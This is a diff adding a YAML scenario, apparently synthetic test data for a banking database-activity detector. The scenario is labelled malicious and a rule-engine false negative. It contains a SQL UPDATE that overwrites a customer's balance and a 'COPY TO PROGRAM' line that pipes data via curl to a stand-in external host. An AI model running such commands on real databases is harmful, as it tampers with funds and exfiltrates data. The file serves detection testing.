@@ -1,0 +1,23 @@
+scenario_id: gen_banking_91_data_tamper_mal_2575
+family_id: gen_banking_91_data_tamper_mal_fam2575
+domain: banking
+time_of_day: '22:20'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: postgres
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.5
+  events:
+  - step_id: act
+    sql: UPDATE accounts SET balance = 694244 WHERE customer_id = 77048
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://sync.partner-mirror.example/ingest
+      -d @-'
+    connects_to:
+      ip: 10.34.9.193
+      port: 3389
